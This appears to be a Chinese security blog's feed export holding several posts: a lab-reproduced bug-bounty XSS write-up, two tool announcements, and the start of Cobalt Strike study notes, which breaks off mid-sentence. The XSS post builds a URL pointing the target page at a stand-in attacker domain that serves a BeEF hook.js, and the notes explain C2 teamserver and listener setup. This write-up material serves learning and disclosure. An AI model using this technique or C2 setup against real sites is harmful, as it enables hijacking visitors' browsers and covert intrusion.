src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-57-35.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 经验总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cobalt Strike </tag>
            
            <tag> MSF </tag>
            
            <tag> 经验总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【经验总结】记录一次有点儿不一样的XSS</title>
      <link href="//210107-162325.html"/>
      <url>//210107-162325.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近在挖SRC的时候，碰到一个有点儿不一样的XSS，在此简单记录一下。</p><p>为了展示出较好的效果同时不泄露网站相关信息， 这里我在自己本地按照当时目标的情况简单搭建了一个靶场。</p><p>注意：文中的<code>target.com</code>代指目标域名，<code>evil.com</code>代指自己的攻击域名。</p><h1 id="0x01-发现"><a href="#0x01-发现" class="headerlink" title="0x01 发现"></a>0x01 发现</h1><p>在测试过程中，发现目标存在这样的一个 URL</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;target.com&#x2F;index.html?&#x2F;test.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/diffxss-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>在当前页面中包含了URL参数里的页面，如果将<code>/test.html</code>改为不存在的页面就会提示404</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/diffxss-2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>查看一下源码，可以发现页面将传参的内容与站点域名进行了拼接，随后对该页面进行访问</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/diffxss-3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x02-思考利用"><a href="#0x02-思考利用" class="headerlink" title="0x02 思考利用"></a>0x02 思考利用</h1><p>目标看到这里，刚开始只是尝试的一些常规的 XSS Payload，发现目标都进行了很好的过滤，于是陷入了短暂的思考中。</p><p>之后再看看源码，想着既然它是把参数后的值拼接到站点域名后面，那如果我有个<code>target.com.evil.com</code>的域名，我在URL中传参<code>.evil.com</code>，页面拼接后所访问的地址不就是这样：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;target.com.evil.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样一来，我在<code>target.com.evil.com</code>站点下，开个beef，在我访问<code>http://target.com/index.html?.evil.com</code>的时候，目标页面就会访问到我自己的域名，如果访问的域名页面中包含了 beef 的 hook.js，那目标不就上线了嘛，nice</p><p><strong>开整！</strong></p><p>首先要有个域名和 vps ，有了域名后再设置一个 <code>target.com</code> 的子域名，设置子域名也很简单，直接在域名的DNS记录中添加一条A记录即可，名称就是<code>target.com</code>，内容就是要解析的 vps IP 地址。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/diffxss-4.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>测试一下，beef 的 hook.js 能不能访问</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/diffxss-5.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>这里有个坑，如果域名没有备案并且 vps 是国内的，如果同时 beef 开在 80 端口，就会导致页面一打开就会提示域名未备案，这时只要把 beef 放在其他不常用的端口上就不会提示域名未备案了。</p></blockquote><p>在 beef 的 hook.js 页面可以成功访问之后，就可以构造 URL 了，这时只要 URL 后传入一个包含 hook.js 的页面就可以上线了，这里以 beef 的 demo 页面<code>/demos/basic.html</code>作为示例。</p><p>最后构造 URL 为：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;target.com&#x2F;index.html?.evil.com:3000&#x2F;demos&#x2F;basic.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>浏览器打开该页面</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/diffxss-6.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>可以看到当前页面成功访问到了<code>target.com.evil.com:3000/demos/basic.html</code>，此时看看 beef 里有没有上线</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/diffxss-7.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>beef 成功上线，最后再来弹个窗，嘿嘿</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/diffxss-8.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/diffxss-9.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x03-最后"><a href="#0x03-最后" class="headerlink" title="0x03 最后"></a>0x03 最后</h1><p>这个漏洞提交上去之后，相较于之前提交的较为常规的XSS，厂商给这个XSS 是其双倍的积分。</p><p>平时自己还是要多多理解漏洞产生的原因才是，要是直接用工具扫、Fuzz字典跑估计就发现利用不了这个洞了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 经验总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SRC </tag>
            
            <tag> XSS </tag>
            
            <tag> 经验总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【工具分享】一款自己经常使用的URL批量识别小工具</title>
      <link href="//202025-235012.html"/>
      <url>//202025-235012.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这是一款对URL进行批量识别存活、常见端口、标题、Banner等信息的工具，虽然之前也写过类似的工具，但是要不速度太慢就是识别出来的效果不够理想。</p><p>后来发现httpx能够很好的完成这样的一个需求，但是 httpx 的命令是在有些长，每次使用都要输入很长的一段命令，而且导出的数据不够直观。</p><p>所以本工具在httpx的基础上简化了输入的命令长度同时将结果进行excel表格的导出，便于对收集到的信息进行整理。</p><p>这个工具自己也使用了差不多有1个月的时间，发现平时在做资产收集的时候，效率提升的还是很明显的，因此便打算把这个工具分享出来供大家使用，如果感觉还不错欢迎给个star。</p><p>本工具项目地址：<a href="https://github.com/teamssix/url_batch_discovery">https://github.com/teamssix/url_batch_discovery</a></p><h1 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h1><h2 id="1、安装-httpx"><a href="#1、安装-httpx" class="headerlink" title="1、安装 httpx"></a>1、安装 httpx</h2><p>在使用本工具前需要先安装httpx工具，httpx项目地址：<a href="https://github.com/projectdiscovery/httpx">https://github.com/projectdiscovery/httpx</a></p><p>在httpx的<a href="https://github.com/projectdiscovery/httpx/releases">releases</a>页面下载适合自己系统的安装包，然后添加到系统路径即可，最后在命令行中能成功执行<code>httpx --version</code>即表示安装成功了。</p><h1 id="2、安装本工具"><a href="#2、安装本工具" class="headerlink" title="2、安装本工具"></a>2、安装本工具</h1><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;teamssix&#x2F;url_batch_discovery.gitcd url_batch_discoverypip3 install -r requirements.txt -i https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F;python3 url_batch_discovery.py -h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x02-使用"><a href="#0x02-使用" class="headerlink" title="0x02 使用"></a>0x02 使用</h1><ul><li>命令说明</li></ul><pre class="line-numbers language-none"><code class="language-none">-h, --help  show this help message and exit-l LIST     指定URL列表文件-m MATCH    指定要匹配的关键字，返回结果中将只包含存在该关键字的内容-o OUTPUT   导出的文件路径，默认保存在.&#x2F;output&#x2F;文件夹内，导出文件格式为xlsx，格式：&#x2F;path1&#x2F;path2&#x2F;-p PORT     指定要检测的端口，默认只对80和443端口进行检测，格式：80,443,8000-8010-t THREADS  指定线程大小，默认50个线程-u URL      指定单个URL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>对 url.txt 里的url进行批量识别</li></ul><pre class="line-numbers language-none"><code class="language-none">python3 url_batch_discovery.py -l url.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>对 url.ttx 进行80,443,8080-8090的端口识别</li></ul><pre class="line-numbers language-none"><code class="language-none">python3 url_batch_discovery.py -l url.txt -p 80,443,8080-8090<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>对 url.ttx 进行批量识别，且只返回网页中存在“JBoos”字符的URL</li></ul><pre class="line-numbers language-none"><code class="language-none">python3 url_batch_discovery.py -l url.txt -m &quot;JBoss&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="0x03-工具截图"><a href="#0x03-工具截图" class="headerlink" title="0x03 工具截图"></a>0x03 工具截图</h1><ul><li>帮助信息</li></ul><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/url_batch_discovery_1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><ul><li>导出表格</li></ul><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/url_batch_discovery_2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x04-注意事项"><a href="#0x04-注意事项" class="headerlink" title="0x04 注意事项"></a>0x04 注意事项</h1><ul><li>本工具使用 Python3 开发，因此需要 Python3 环境支持</li><li>本工具核心功能来自 httpx</li><li>本工具的运行速度取决于你设置的线程大小以及端口数量的多少</li><li>如果使用过程中碰到 bug，欢迎提 issue，如果帮助到你，欢迎赏个 star</li></ul><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 工具分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 批量工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【工具分享】一个爬取各大SRC厂家公告的小工具</title>
      <link href="//201115-194850.html"/>
      <url>//201115-194850.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>平时在挖洞的时候，往往会关注其有没有活动之类的公告，但是国内那么多家厂商，一个个的去关注难免效率比较低，因此这里写了一个爬取各大SRC厂家公告的小工具，没啥技术含量，都是体力活。</p><p>工具下载地址：<a href="https://github.com/teamssix/src_notice">https://github.com/teamssix/src_notice</a></p><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>✔ 爬取各个SRC平台的公告通知</p><p>✔ 对2020年发布的活动通知进行红色高亮显示</p><p>✔ 【进阶版】将当天发布的公告推送到微信上，结合系统定时任务可实现SRC平台公告监测</p><blockquote><p><strong>在我的微信公众号“TeamsSix”后台回复“SRC”即可获得进阶版下载地址</strong></p></blockquote><p>✔ 支持的SRC平台【当前共计27家】：</p><p>360、58、阿里、阿里本地生活、爱奇艺、百度、贝壳、哔哩哔哩、菜鸟、滴滴出行、度小满、瓜子、京东、蚂蚁金服、美团、陌陌、OPPO、平安、水滴互助、顺丰、腾讯、vivo、网易、唯品会、WIFI万能钥匙、中通、字节跳动</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;teamssix&#x2F;src_notice.gitcd src_noticepip3 install -r requirements.txtpython3 src_notice.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-11-15_18-35-17.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="进阶版"><a href="#进阶版" class="headerlink" title="进阶版"></a>进阶版</h1><p>进阶版比普通版多了一个微信通知的功能，结合系统定时任务可实现SRC平台公告监测。<strong>在我的微信公众号“TeamsSix”后台回复“SRC”即可获得进阶版下载地址</strong></p><h3 id="如何实现微信通知？"><a href="#如何实现微信通知？" class="headerlink" title="如何实现微信通知？"></a>如何实现微信通知？</h3><p>进阶版下载好后，在 503 行代码中添加上你自己的 Server酱 key 就行了， Server酱 key 的申请地址为：<a href="http://sc.ftqq.com/">http://sc.ftqq.com/</a></p><h3 id="如何实现公告监测？"><a href="#如何实现公告监测？" class="headerlink" title="如何实现公告监测？"></a>如何实现公告监测？</h3><p>首先在 vps 上下载安装该工具，之后设置定时任务即可。比如我想在每天的上午 9 点获取一下各大 SRC 有没有新的公告：</p><p>1、输入<code>crontab -e</code></p><p>2、在打开的界面中输入<code>00 9 * * * python3 /root/src_notice/src_notice.py</code>即可。</p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>1、如果之前没有编辑过定时任务，第一次打开会提示选择编辑器，根据自己喜好选择即可</p><p>2、上面命令中的 <code>python3 /root/src_notice/src_notice.py</code>要修改成你自己的绝对路径，我这里是在 root 目录下的</p><h1 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h1><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 工具分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 批量工具 </tag>
            
            <tag> SRC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【建议收藏】CS学习笔记合集</title>
      <link href="//201023-192553.html"/>
      <url>//201023-192553.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>自2020年4月份至2020年10月份，笔者更新了自己在学习 Cobalt Strike 过程中的 28 篇笔记，并将笔记同步更新到了自己的公众号、博客、CSDN、知乎、简书等平台，特在此整理成合集发布出来。</p><p>在合集中对于笔记的标题、内容顺序适当的进行了一些更改，从而使得整体看起来更加和谐。</p><p>建议收藏本文，随时翻阅查看。</p><blockquote><p>此合集仅在我的公众号和博客更新，我的公众号：TeamsSix</p></blockquote><h1 id="0x01-基础操作"><a href="#0x01-基础操作" class="headerlink" title="0x01 基础操作"></a>0x01 基础操作</h1><h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>第一次接触CS的时候，是有人在群里发了一个CS最新版的安装包，当时第一反应，CS ？？？</p><p>作为小白的我，在角落里看着群里的大佬们讨论的十分起劲儿，而我这个萌新对于他们所讨论的东西却听都没听过。</p><p>于是乎，新的一期学习笔记开整，本期学习笔记如题：《Cobalt Strike学习笔记》，简称《CS学习笔记》，这期笔记预计会更新28篇文章，学习资源来自B站视频，视频链接在文章底部。</p><p>由于这只是学习笔记，因此不会像教程一样详尽，一些我个人已经了解的东西或许不会记在笔记里，因此把笔记当做教程阅读是不合适的。</p><p><strong>CS是什么？</strong></p><p>Cobalt Strike是一款渗透测试神器，常被业界人称为CS神器。Cobalt Strike已经不再使用MSF而是作为单独的平台使用，它分为客户端与服务端，服务端是一个，客户端可以有多个，可被团队进行分布式协团操作。</p><p>Cobalt Strike集成了端口转发、扫描多模式端口Listener、Windows exe程序生成、Windows dll动态链接库生成、java程序生成、office宏代码生成，包括站点克隆获取浏览器的相关信息等。</p><p>早期版本Cobalt Srtike依赖Metasploit框架，而现在Cobalt Strike已经不再使用MSF而是作为单独的平台使用。</p><p>这个工具的社区版是大家熟知的Armitage(一个MSF的图形化界面工具)，而Cobalt Strike大家可以理解其为Armitage的商业版。</p><p><strong>CS的发展</strong></p><ul><li><p>Armitage [2010-2012]</p><p>Armitage是一个红队协作攻击管理工具，它以图形化方式实现了Metasploit框架的自动化攻击。Armitage采用Java构建，拥有跨平台特性。</p></li><li><p>Cobalt Strike 1.x [2012-2014]</p><p>Cobalt Strike 增强了Metasploit Framework在执行目标攻击和渗透攻击的能力。</p></li><li><p>Cobalt Strike 2.x [2014-?]</p><p>Cobalt Strike 2是应模拟黑客攻击的市场需求而出现的，Cobalt Strike 2是以malleable C2技术的需求为定位的，这个技术使Cobalt Strike的能力更强了一些。</p></li><li><p>Cobalt Strike 3.x [2015-?]</p><p>Cobalt Strike 3 的攻击和防御都不用在Metasploit Framework平台（界面）下进行。</p><p>如今 Cobalt Strike 4.0 也已经发布，改动相比 3.x 还是不小的，笔者在演示的时候使用的 Cobalt Strike 4.0，看的视频教程是 3.x 的教程。</p></li></ul><p><strong>接下来会用到的工具和环境</strong></p><ul><li>Cobalt Strike</li><li>Kali</li><li>Metasploit Framework</li><li>PowerSploit</li><li>PowerTools</li><li>Veil Evasion Framework</li></ul><h2 id="2、客户端与服务端的连接"><a href="#2、客户端与服务端的连接" class="headerlink" title="2、客户端与服务端的连接"></a>2、客户端与服务端的连接</h2><p>Cobalt Strike使用C/S架构，Cobalt Strike的客户端连接到团队服务器，团队服务器连接到目标，也就是说Cobalt Strike的客户端不与目标服务器进行交互，那么Cobalt Strike的客户端如何连接到团队服务器就是本文所学习的东西。</p><p><strong>准备工作</strong></p><p>Cobalt Strike的客户端想连接到团队服务器需要知道三个信息：</p><ul><li>团队服务器的外部IP地址</li><li>团队服务器的连接密码</li><li>（此项可选）决定Malleable C2工具的哪一个用户配置文件被用于团队服务器</li></ul><p>知道这些信息后，就可以使用脚本开启团队服务器了，值得注意的是Cobalt Strike团队服务器只能运行在Linux环境下。</p><p><strong>开启团队服务器</strong></p><p>开启团队服务器命令一般如下所示：</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;teamserver your_ip your_passowrd [config_file]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs2-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>服务端开启后，就可以开启客户端进行连接了</p><p><strong>连接到团队服务器</strong></p><p>在Linux下，直接运行start.sh脚本文件，输入团队服务器的IP、密码和自己的用户名进行连接</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs2-2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>点击Connect连接后，会有个提示信息，如果承认提示信息中的哈希值就是所要连接团队服务器的哈希值就点击Yes，随后即可打开CS客户端界面</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs2-3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>在Windows下的连接方法也基本一致，直接双击start.bat文件，输入IP、密码、用户名，点击Connect即可</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs2-4.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs2-5.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>在连接后，团队之间就可以通过客户端进行沟通，信息共享</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs2-6.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>Cobalt Strike不是用来设计指导在一个团队服务器下进行工作的，而是被设计成在一次行动中使用多个团队服务器。</p><p>这样设计的目的主要在于运行安全，如果一个团队服务器停止运行了，也不会导致整个行动的失败，所以接下来看看如何连接到多个团队服务器。</p><p><strong>连接到多个团队服务器</strong></p><p>Cobalt Strike连接到多个团队服务器也很简单，直接点击左上角的加号，输入其他团队服务器的信息后，即可连接</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs2-7.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="3、分布式操作"><a href="#3、分布式操作" class="headerlink" title="3、分布式操作"></a>3、分布式操作</h2><p><strong>最基本的团队服务模型</strong></p><p>这里介绍最基本的团队服务模型，具体由三个服务器构成，具体如下所示：</p><ul><li><p>临时服务器（Staging Servers）</p><p>临时服务器介于持久服务器和后渗透服务器之间，它的作用主要是方便在短时间内对目标系统进行访问。</p><p>它也是最开始用于传递payload、获取初始权限的服务器，它承担初始的权限提升和下载持久性程序的功能，因此这个服务器有较高暴露风险。</p></li><li><p>持久服务器（Long Haul Servers）</p><p>持久服务器的作用是保持对目标网络的长期访问，所以持久服务器会以较低的频率与目标保持通信。</p></li><li><p>后渗透服务器（Post-Exploitation Servers）</p><p>主要进行后渗透及横向移动的相关任务，比如对目标进行交互式访问</p></li></ul><p><strong>可伸缩红队操作模型</strong></p><p>可伸缩红队操作模型（Scaling Red Operations）分为两个层次，第一层次是针对一个目标网络的目标单元；第二层次是针对多个目标网络的权限管理单元。</p><p>目标单元的工作：</p><ul><li>负责具体目标或行动的对象</li><li>获得访问权限、后渗透、横向移动</li><li>维护本地基础设施</li></ul><p>访问管理单元的工作：</p><ul><li>保持所有目标网络的访问权限</li><li>获取访问权限并接收来自单元的访问</li><li>根据需要传递对目标单元的访问</li><li>为持续回调保持全局基础环境</li></ul><p><strong>团队角色</strong></p><ul><li><p>开始渗透人员</p><p>主要任务是进入目标系统，并扩大立足点</p></li><li><p>后渗透人员</p><p>主要任务是对目标系统进行数据挖掘、对用户进行监控，收集目标系统的密钥、日志等敏感信息</p></li><li><p>本地通道管理人员</p><p>主要任务有建立基础设施、保持shell的持久性、管理回调、传递全局访问管理单元之间的会话</p></li></ul><h2 id="4、日志与报告"><a href="#4、日志与报告" class="headerlink" title="4、日志与报告"></a>4、日志与报告</h2><p><strong>日志记录</strong></p><p>Cobalt Strike的日志文件在团队服务器下的运行目录中的<code>logs</code>文件夹内，其中有些日志文件名例如<code>beacon_11309.log</code>，这里的<code>11309</code>就是beacon会话的ID。</p><p>按键的日志在<code>keystrokes</code>文件夹内，截屏的日志在<code>screenshots</code>文件夹内，截屏的日志名称一般如<code>screen_015321_4826.jpg</code>类似，其中<code>015321</code>表示时间（1点53分21秒），<code>4826</code>表示ID</p><p><strong>导出报告</strong></p><p>Cobalt Strike生成报告的目的在于培训或帮助蓝队，在<code>Reporting</code>菜单栏中就可以生成报告，关于生成的报告有以下特点：</p><ul><li>输出格式为PDF或者Word格式</li><li>可以输出自定义报告并且更改图标（Cobalt Strike –&gt; Preferences –&gt;Reporting）</li><li>可以合并多个团队服务器的报告，并可以对不同报告里的时间进行校正</li></ul><p><strong>报告类型</strong></p><ul><li>活动报告（Activity Report）<br>此报告中提供了红队活动的时间表，记录了每个后渗透活动。</li><li>主机报告（Hosts Report）<br>此报告中汇总了Cobalt Strike收集的主机信息，凭据、服务和会话也会在此报告中。</li><li>侵害指标报告（Indicators of Compromise）<br>此报告中包括对C2拓展文件的分析、使用的域名及上传文件的MD5哈希。</li><li>会话报告（Sessions Report）<br>此报告中记录了指标和活动，包括每个会话回连到自己的通信路径、后渗透活动的时间线等。</li><li>社工报告（Social Engineering Report）<br>此报告中记录了每一轮网络钓鱼的电子邮件、谁点击以及从每个点击用户那里收集的信息。该报告还显示了Cobalt Strike的System profiler发现的应用程序。</li><li>战术、技巧和程序报告（Tactics,Techniques,and Procedures）<br>此报告将自己的Cobalt Strike行动映射到MITRE的ATT&amp;CK矩阵中的战术，具体可参考<a href="https://attack.mitre.org/">https://attack.mitre.org/</a></li></ul><h1 id="0x02-基础设施"><a href="#0x02-基础设施" class="headerlink" title="0x02 基础设施"></a>0x02 基础设施</h1><p>这一小节学起来感觉有些吃力，里面很多概念理解的不是很清楚，如果有大佬看到描述错误的地方欢迎留言指正，避免误导他人。</p><p>再次声明，这只是我的个人学习笔记，就不要当成教程去看了，建议想学习CS的小伙伴可以看看A-TEAM的中文手册或者网上的一些视频教程。</p><h2 id="1、监听器管理"><a href="#1、监听器管理" class="headerlink" title="1、监听器管理"></a>1、监听器管理</h2><ul><li><p>什么是监听器</p><p>顾名思义，监听器就是等待被入侵系统连接自己的一个服务。</p></li><li><p>监听器的作用</p><p>主要是为了接受payload回传的各类数据，类似于MSF中handler的作用。</p><p>比如payload在目标机器执行以后，就会回连到监听器然后下载执行真正的shellcode代码。</p></li></ul><p>一旦监听器建立起来，团队成员只需要知道这个监听器的名称即可，不用关心监听器背后的基础环境，接下来将深入了解如何准确配置监听器。</p><p>一个监听器由用户定义的名称、payload 类型和几个特定于 payload 的选项组成。</p><p>监听器的名字一般由以下结构组成：</p><pre class="line-numbers language-none"><code class="language-none">Operating System&#x2F;Payload&#x2F;Stager<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>例如：</p><pre class="line-numbers language-none"><code class="language-none">windows&#x2F;beacon_http&#x2F;reverse_http<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>什么是传输器</strong></p><p>攻击载荷<code>payload</code>就是攻击执行的内容。攻击载荷通常被分为两部分：传输器<code>stager</code> 和传输体<code>stage</code>。</p><p>传输器<code>stager</code>是一个小程序，用于连接、下载传输体<code>stage</code>，并插入到内存中。</p><p>我个人理解为：攻击载荷里真正用于攻击的代码是在传输体里。</p><p>所以为什么要有传输体？直接把攻击载荷插入到内存中不更方便快捷、更香么，搞得又是传输器又是传输体的。</p><p>需要传输体是因为在很多攻击中对于能加载进内存，并在成功漏洞利用后执行的数据大小存在严格限制。这就导致在攻击成功时，很难嵌入额外的攻击载荷，正是因为这些限制，才使得传输器变得有必要了。</p><p><strong>创建监听器</strong></p><p>在CS客户端中打开 Cobalt Strike —》Listeners，之后点击Add，此时弹出New Listener窗口，在填写监听器的相关信息之前，需要先来了解监听器有哪些类型。</p><p>Cobalt 